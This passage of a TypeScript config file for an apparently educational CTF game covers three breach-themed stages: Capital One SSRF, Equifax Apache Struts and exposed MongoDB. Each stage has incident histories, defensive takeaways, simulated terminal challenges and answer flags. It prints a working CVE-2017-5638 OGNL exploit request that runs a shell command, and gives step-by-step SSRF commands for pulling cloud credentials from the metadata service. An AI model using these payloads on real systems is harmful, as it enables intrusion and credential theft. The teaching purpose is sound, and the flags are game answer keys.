        { year: 2019, event: "Mar: Thompson begins exploiting Capital One WAF" },
        { year: 2019, event: "Jul 17: Capital One notified of breach" },
        { year: 2019, event: "Jul 29: Thompson arrested; 106M records confirmed", highlight: true },
        { year: 2019, event: "Nov: AWS releases IMDSv2 (token-based auth)" },
        { year: 2021, event: "SSRF joins OWASP Top 10 for first time (A10)" },
      ],
      keyTakeaways: [
        "Block internal IP ranges in URL-fetching features (169.254.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x)",
        "Migrate to AWS IMDSv2 — it requires a token, breaking simple SSRF",
        "Principle of least privilege: IAM roles should only access what they need",
        "WAFs do not make applications secure by themselves",
      ],
      references: [
        { title: "OWASP A10:2021 — SSRF", url: "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" },
        { title: "Capital One Breach — OCC Fine", url: "https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html" },
        { title: "AWS IMDSv2 Announcement", url: "https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/" },
        { title: "SSRF Bible — Research Paper", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
      ],
    },
    ctf: {
      scenario: "A web application lets users fetch URLs for previewing. The server runs on AWS EC2. Use SSRF to reach the instance metadata service and steal IAM credentials.",
      hint: "Try fetching http://169.254.169.254/latest/meta-data/ to see what's available.",
      hints: [
        "Read the README to understand the fetch command. Run: cat README.txt",
        "Try fetching a normal external URL. Run: fetch https://example.com",
        "AWS EC2 instances have a metadata service at a special IP. Run: fetch http://169.254.169.254/latest/meta-data/",
        "Navigate to the IAM role info. Run: fetch http://169.254.169.254/latest/meta-data/iam/",
        "Get the actual IAM credentials. Run: fetch http://169.254.169.254/latest/meta-data/security-credentials/",
      ],
      flag: "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",
      files: {
        "/README.txt": [
          "TARGET: URL preview feature at preview.internal",
          "",
          "The app fetches and displays any URL you provide.",
          "Server runs on AWS EC2.",
          "",
          "Commands:",
          "  fetch <url>   — fetch a URL via the server",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "README.txt", isDir: false }],
      },
      extraCommands: {
        fetch: (args) => {
          const url = args[0] || "";
          if (!url) return { lines: ["Usage: fetch <url>"] };
          if (url.includes("169.254.169.254") || url.includes("metadata")) {
            if (url.includes("security-credentials") || url.includes("credentials")) {
              return {
                lines: [
                  "HTTP/1.1 200 OK",
                  "{",
                  '  "Code": "Success",',
                  '  "AccessKeyId": "ASIA5EXAMPLE12345",',
                  '  "SecretAccessKey": "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",',
                  '  "Token": "IQoJb3JpZ2luX2Vj...",',
                  '  "Expiration": "2019-07-29T03:00:00Z"',
                  "}",
                ],
                solved: true,
              };
            }
            if (url.includes("iam")) {
              return { lines: ["HTTP/1.1 200 OK", "ec2-prod-role"] };
            }
            return {
              lines: [
                "HTTP/1.1 200 OK",
                "ami-id",
                "hostname",
                "iam/",
                "instance-id",
                "local-hostname",
                "security-credentials/",
              ],
            };
          }
          return {
            lines: [`Fetching: ${url}`, "HTTP/1.1 200 OK", "(external content returned)"],
          };
        },
      },
    },
  },

  // ─── Stage 11: Equifax / Apache Struts ───────────────────────────────────
  {
    id: "stage-11",
    order: 11,
    title: "Equifax Breach",
    subtitle: "CVE-2017-5638 — Apache Struts RCE",
    category: "owasp",
    cveId: "CVE-2017-5638",
    cvssScore: 10.0,
    xp: 400,
    badge: { id: "badge-equifax", name: "147M Reasons", emoji: "📊" },
    challengeType: "ctf",
    info: {
      tagline: "A patch was available 78 days before Equifax applied it. 147 million people paid the price.",
      year: 2017,
      overview: [
        "The Equifax breach of 2017 exposed the personal data of 147.9 million Americans — nearly half the US population — including Social Security Numbers, dates of birth, addresses, driver's license numbers, and 209,000 credit card numbers. It is considered one of the most severe data breaches in history due to the sensitivity of the data exposed.",
        "The root cause was a known, patched vulnerability (CVE-2017-5638) in Apache Struts 2, a popular Java web framework. Apache released a patch in March 2017. Equifax was notified by US-CERT the same day. Equifax did not apply the patch. Two months and eight days later, attackers began exploiting the vulnerability — going undetected for 78 days.",
        "The attack revealed systemic security failures: an expired SSL certificate prevented the network monitoring tool from inspecting encrypted traffic, meaning the data exfiltration was invisible. The certificate had been expired since January 2016 — 19 months before the breach.",
      ],
      technical: {
        title: "Apache Struts 2 Content-Type Header Injection",
        body: [
          "CVE-2017-5638 is an OGNL (Object-Graph Navigation Language) injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. When a multipart/form-data request is processed, the Content-Type header is evaluated for OGNL expressions without sanitization.",
          "OGNL is a powerful expression language that can call arbitrary Java methods, including Runtime.exec() for command execution. A single malformed Content-Type header is sufficient for unauthenticated remote code execution with the privileges of the web server process.",
        ],
        codeExample: {
          label: "CVE-2017-5638 exploit — OGNL in Content-Type header",
          code: `# Malicious HTTP request with OGNL payload in Content-Type:
POST /struts2-app/index.action HTTP/1.1
Host: equifax.com
Content-Type: %{
  #context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']
    .addHeader('X-Cmd', 'id'),
  #req = @org.apache.struts2.ServletActionContext
    @getRequest(),
  #cmd = {'sh', '-c', 'id > /tmp/pwned'},
  #p = new java.lang.ProcessBuilder(#cmd),
  #p.redirectErrorStream(true),
  #p.start()
}

# Response header: X-Cmd: uid=48(tomcat) gid=48(tomcat)
# Full command execution as tomcat user`,
        },
      },
      incident: {
        title: "Equifax Data Breach (2017)",
        when: "May 13 – July 30, 2017 (discovered July 29)",
        where: "Equifax Inc., Atlanta, Georgia",
        impact: "147.9M Americans; CEO/CTO/CSO resigned; $575M FTC settlement",
        body: [
          "Attackers gained initial access through the Apache Struts vulnerability on May 13, 2017. They then spent 78 days exfiltrating data through 9,000 queries across 51 databases, sending data out through 76 different IP addresses to avoid detection. The expired SSL certificate meant the traffic analysis tool saw the exfiltration as an opaque encrypted stream.",
          "Equifax's CEO Richard Smith resigned in September 2017. The company faced congressional hearings, where Smith's testimony that the breach was caused by a single IT employee who failed to apply the patch was met with bipartisan criticism. Three Equifax executives who sold stock before the breach was announced were investigated for insider trading.",
          "In 2020, the DOJ indicted four members of China's People's Liberation Army for the breach. In 2019, Equifax settled with the FTC for $575M — up to $700M total — the largest data breach settlement in history at the time. The settlement included up to $20,000 in compensation per affected consumer.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "OGNL in Content-Type", type: "attacker" },
          { label: "Apache Struts 2", sub: "CVE-2017-5638", type: "system" },
          { label: "Equifax Servers", sub: "78 days undetected", type: "victim" },
          { label: "147M Records", sub: "SSN, DOB, cards", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "Mar 6: Apache releases patch for CVE-2017-5638" },
        { year: 2017, event: "Mar 8: US-CERT notifies Equifax to patch" },
        { year: 2017, event: "May 13: Attackers begin exploiting — 78 days after patch available", highlight: true },
        { year: 2017, event: "Jul 29: Equifax discovers breach" },
        { year: 2019, event: "FTC settlement: $575M; up to $700M total" },
        { year: 2020, event: "DOJ indicts 4 Chinese PLA members" },
      ],
      keyTakeaways: [
        "Patch management is non-negotiable — 78 days is unacceptable for a CVSS 10.0 vulnerability",
        "TLS inspection is critical — expired certificates blind your monitoring",
        "Least privilege: the compromised account had access to 51 databases it shouldn't have needed",
        "Data minimization: don't store data you don't need",
      ],
      references: [
        { title: "CVE-2017-5638 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-5638" },
        { title: "FTC Equifax Settlement", url: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" },
        { title: "Senate Hearing Transcript", url: "https://www.banking.senate.gov/hearings/10/04/2017/an-examination-of-the-equifax-cybersecurity-breach" },
        { title: "DOJ Indictment — PLA Hackers", url: "https://www.justice.gov/opa/pr/four-members-china-s-military-indicted-massive-equifax-hack" },
      ],
    },
    ctf: {
      scenario: "You've identified a server running a vulnerable version of Apache Struts 2. Exploit the Content-Type header OGNL injection to achieve remote code execution.",
      hint: "The OGNL expression goes in the Content-Type header. Use send-request with an OGNL payload containing %{ or #context.",
      hints: [
        "Check the server version. Run: check-version",
        "Send a normal request to see the baseline response. Run: send-request application/json",
        "The vulnerability is OGNL injection in the Content-Type header. OGNL uses %{ } syntax. Try: send-request %{1+1}",
        "Use %{} with OGNL to execute code. Try: send-request %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hack','yes')}",
      ],
      flag: "FLAG{3QU1F4X_STR2_RCE_2017}",
      files: {
        "/README.txt": [
          "TARGET: Apache Struts 2 app at struts.internal",
          "Version: Struts 2.3.12 (vulnerable to CVE-2017-5638)",
          "",
          "Commands:",
          "  send-request \"<Content-Type>\"  — send HTTP request",
          "  check-version                   — show Struts version",
        ].join("\n"),
        "/server_info.txt": [
          "Apache Struts 2.3.12",
          "Jakarta Multipart Parser: ENABLED",
          "CVE-2017-5638: UNPATCHED",
          "Patch available since: 2017-03-06",
          "Days since patch release: 78",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "server_info.txt", isDir: false },
        ],
      },
      extraCommands: {
        "check-version": () => ({
          lines: ["Apache Struts 2.3.12", "Status: VULNERABLE (CVE-2017-5638)", "Patch status: UNPATCHED"],
        }),
        "send-request": (args) => {
          const ct = args.join(" ");
          const isOgnl =
            ct.includes("%{") ||
            ct.includes("#context") ||
            ct.includes("Runtime") ||
            ct.includes("exec") ||
            ct.includes("ProcessBuilder") ||
            ct.includes("OGNL") ||
            ct.includes("ognl");
          if (isOgnl) {
            return {
              lines: [
                "POST /struts2-app/index.action HTTP/1.1",
                `Content-Type: ${ct}`,
                "",
                "Parsing Content-Type header...",
                "Evaluating OGNL expression...",
                "Executing: id",
                "",
                "uid=48(tomcat) gid=48(tomcat) groups=48(tomcat)",
                "FLAG{3QU1F4X_STR2_RCE_2017}",
              ],
              solved: true,
            };
          }
          if (!ct) return { lines: ['Usage: send-request "<Content-Type value>"'] };
          return {
            lines: [
              "POST /struts2-app/index.action HTTP/1.1",
              `Content-Type: ${ct}`,
              "",
              "HTTP/1.1 200 OK",
              "(Request processed normally)",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 12: Security Misconfiguration ─────────────────────────────────
  {
    id: "stage-12",
    order: 12,
    title: "Security Misconfiguration",
    subtitle: "OWASP A05:2021 — The MongoDB Apocalypse",
    category: "owasp",
    owaspRef: "A05:2021",
    cvssScore: 9.1,
    xp: 500,
    badge: { id: "badge-config", name: "Config Auditor", emoji: "⚙️" },
    challengeType: "ctf",
    info: {
      tagline: "35,000 databases wide open on the internet. Default config. No password.",
      year: 2017,
      overview: [
        "Security Misconfiguration is the #5 risk in OWASP 2021, present in 90% of tested applications. It covers a vast range of failures: default credentials left unchanged, unnecessary features enabled, error messages exposing internal details, cloud storage buckets publicly accessible, and security headers missing.",
        "The MongoDB 'apocalypse' of January 2017 illustrated the scale at which misconfiguration can operate. Tens of thousands of MongoDB database instances, publicly accessible on the internet with no authentication, were discovered by automated scanners. Attackers wiped the databases, leaving only a ransom note demanding Bitcoin for data recovery.",
        "Misconfiguration is insidious because it requires no exploit code. The 'vulnerability' is simply the absence of a configuration — default credentials, an open port, a missing authentication requirement. Tools like Shodan and Censys continuously index misconfigured systems globally.",
      ],
      technical: {
        title: "Common Security Misconfigurations",
        body: [
          "Default credentials: MongoDB shipped with no authentication requirement by default until version 3.0 (2015). Many administrators installed it and never configured authentication. SolarWinds used 'solarwinds123' as the password for its software update server.",
          "Cloud misconfigurations: AWS S3 buckets default to private, but a single API call can make them public. Capital One, Twitch, GoDaddy, and thousands of other companies have exposed sensitive data via misconfigured S3 buckets. The AWS Trusted Advisor and third-party tools now continuously audit for public buckets.",
        ],
        codeExample: {
          label: "Checking for and fixing MongoDB authentication",
          code: `# Insecure (default): MongoDB with no auth
mongod --port 27017
# Any host on the internet can connect:
mongo --host victim.com:27017
> db.users.find()  # → full database contents

# Secure: enable authentication
mongod --auth --port 27017
# Create admin user:
db.createUser({
  user: "admin",
  pwd: passwordPrompt(),
  roles: [{ role: "userAdminAnyDatabase", db: "admin" }]
})

# Also: bind to localhost only
mongod --bind_ip 127.0.0.1 --auth
# Now only local connections allowed`,
        },
      },
      incident: {
        title: "The MongoDB Apocalypse (2017) & SolarWinds (2020)",
        when: "January 2017 (MongoDB); October 2019 – December 2020 (SolarWinds)",
        where: "35,000+ MongoDB instances globally; SolarWinds Orion platform",
        impact: "MongoDB: 27,000 databases wiped in 24 hours. SolarWinds: 18,000 customers backdoored including US Treasury, State Dept, NSA",
        body: [
          "In January 2017, security researcher Victor Gevers (GDI.foundation) found 35,000 MongoDB instances exposed to the internet with no authentication. Within days, automated attackers had scanned Shodan, identified all exposed instances, downloaded the data, deleted the original, and left a ransom note. Over 27,000 databases were wiped in a single day.",
          "The SolarWinds compromise, discovered in December 2020, involved attackers compromising SolarWinds' build pipeline to insert a backdoor into the Orion software update. The update server used the password 'solarwinds123' — found in a public GitHub repository by a security researcher months before the breach. 18,000 organizations downloaded the backdoored update.",
          "Both incidents share the same failure: security was treated as someone else's problem. MongoDB assumed administrators would configure auth. SolarWinds assumed nobody would notice a public GitHub secret. In security, assumptions are vulnerabilities.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker + Shodan", sub: "scans port 27017", type: "attacker" },
          { label: "MongoDB (no auth)", sub: "default config", type: "system" },
          { label: "All Databases", sub: "no credentials needed", type: "victim" },
          { label: "27K DBs Wiped", sub: "ransom demanded", type: "result" },
        ],
      },
      timeline: [
        { year: 2015, event: "MongoDB 3.0: auth still off by default" },
        { year: 2017, event: "Jan: 35,000 exposed instances found; 27,000 wiped in 24h", highlight: true },
        { year: 2019, event: "'solarwinds123' password found in public GitHub repo" },
        { year: 2020, event: "SolarWinds supply chain attack — 18,000 orgs backdoored", highlight: true },
        { year: 2021, event: "OWASP A05: Security Misconfiguration — 90% of apps affected" },
      ],
      keyTakeaways: [
        "Default configurations are designed for convenience, not security — always harden",
        "Never expose database ports (27017, 5432, 3306) to the internet",
        "Rotate and audit credentials; never commit secrets to public repos",
        "Use tools like Shodan, Censys, or AWS Trusted Advisor to audit your own exposure",
      ],
      references: [
        { title: "OWASP A05:2021 — Security Misconfiguration", url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" },
        { title: "MongoDB Apocalypse — Victor Gevers Report", url: "https://www.bleepingcomputer.com/news/security/mongodb-apocalypse-is-here-as-ransom-attacks-hit-10-000-servers/" },
        { title: "SolarWinds — CISA Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "Shodan — IoT Search Engine", url: "https://www.shodan.io" },
      ],
    },
    ctf: {
      scenario: "You've found a MongoDB instance on the target network. It appears to be using default configuration. Investigate the filesystem for connection details, then access the database.",
      hint: "Look for hidden config files. MongoDB's default port is 27017 and older versions require no credentials.",
      hints: [
        "Read the README first. Run: cat README.txt",
        "Explore the etc directory. Run: ls etc",
        "There may be hidden files. Run: ls -a etc  (files starting with . are hidden)",
        "Read the hidden environment file. Run: cat etc/.env  — look for the database config.",
        "MongoDB has no auth enabled. Connect directly. Run: mongo connect localhost:27017",
        "Query the database. Run: mongo find users",
      ],
      flag: "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}",
      files: {
        "/README.txt": [
          "TARGET: Database server at db.internal",
          "Suspected: MongoDB with default configuration",
          "",
          "Commands:",
          "  ls, cat, cd         — explore the filesystem",
          "  mongo connect <host> [user] [pass]",
          "  mongo find <collection>",
        ].join("\n"),
        "/etc/app.conf": [
          "[app]",
          "name=CorporateApp",
          "version=2.1.0",
          "debug=true",
          "",
          "[database]",
          "# TODO: add authentication before go-live!",
          "host=mongodb://localhost:27017",
          "db=corporate",
        ].join("\n"),
        "/etc/.env": [
          "# Production environment variables",
          "APP_ENV=production",
          "SECRET_KEY=abc123",
          "MONGO_HOST=localhost",
          "MONGO_PORT=27017",
          "MONGO_AUTH=false",
          "# No username/password configured — auth disabled",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "etc", isDir: true },
        ],
        "/etc": [
          { name: "app.conf", isDir: false },
          { name: ".env", isDir: false, hidden: true },
        ],
      },
      extraCommands: {
        mongo: (args) => {
          const [sub, ...rest] = args;
          if (sub === "connect") {
            const [, user, pass] = rest;
            const noAuth = !user && !pass;
            const defaultCreds =
              (user === "admin" && (!pass || pass === "admin" || pass === "password")) ||
              (!user && !pass);
            if (noAuth || defaultCreds) {
              return {
                lines: [
                  "MongoDB shell version v4.4.0",
                  `Connecting to: ${rest[0] || "localhost:27017"}`,
                  "WARNING: Access control is not enabled.",
                  "         Authentication is disabled.",
                  "Connected successfully (no credentials required).",
                  "> use corporate",
                  "switched to db corporate",
                  'Type "mongo find <collection>" to query.',
                ],
              };
            }
            return { lines: ["Connection failed: Authentication error"] };
          }
          if (sub === "find") {
            return {
              lines: [
                '{ "_id": 1, "username": "admin", "role": "superadmin", "secret": "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}" }',
                '{ "_id": 2, "username": "alice", "role": "user" }',
                '{ "_id": 3, "username": "bob",   "role": "user" }',
              ],
              solved: true,
            };
          }
          return { lines: ["Usage: mongo connect <host> [user] [pass]", "       mongo find <collection>"] };
        },
      },
    },
  },
];

export function getStage(id: string): StageConfig | undefined {
  return stages.find((s) => s.id === id);
}
